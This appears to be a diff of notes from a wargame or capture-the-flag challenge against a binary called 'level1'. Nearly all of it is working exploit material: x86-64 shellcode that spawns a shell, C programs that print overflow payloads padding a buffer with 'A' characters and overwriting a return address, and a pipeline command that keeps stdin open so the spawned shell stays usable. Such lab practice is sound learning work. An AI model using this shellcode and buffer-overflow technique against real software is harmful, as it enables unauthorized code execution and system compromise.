@@ -44,7 +44,21 @@ int main ()
 #we hade code to shell at the start of the buffer: \x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05
 
 #include <stdio.h>
+
 int main ()
 {
-	printf("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1e\x55\xe4\xb7");
+	printf("\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x1e\x55\xe4\xb7");
 }
+
+#we saw a fct not used
+#include <stdio.h>
+
+int main ()
+{
+    printf("aAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x44\x84\x04\x08");
+}
+
+#but we got a coredump, when we look gdb. The shell return 0
+
+#the shell return 0 because we are sending EOF, we need to keep stdin open during the process
+(/tmp/print; cat) | ~/level1
